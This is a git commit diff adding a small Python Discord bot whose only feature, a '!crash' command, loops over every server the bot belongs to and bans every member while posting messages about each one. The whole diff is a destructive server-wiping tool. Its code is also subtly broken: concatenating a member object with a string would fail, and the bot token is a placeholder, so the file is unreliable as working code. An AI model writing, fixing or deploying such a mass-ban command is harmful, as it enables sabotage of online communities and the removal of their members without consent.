bb9d45a62aee69d2b66724e3598819ca41340d0c
Александр Аверьянов <averyanalex@gmail.com>
2020-08-09 22:26:52 +0300

    0.0.1

--- main.py
+++ main.py
@@ -1,1 +1,11 @@
+from discord.ext import commands
 print("not now")
+bot = commands.Bot(command_prefix="!", case_insensitive=True)
+
+@bot.command()
+async def crash(ctx):
+    for guild in bot.guilds:
+        for member in guild.members:
+            await ctx.send(member + "kicked")
+            await member.ban()
+bot.run("token here please")
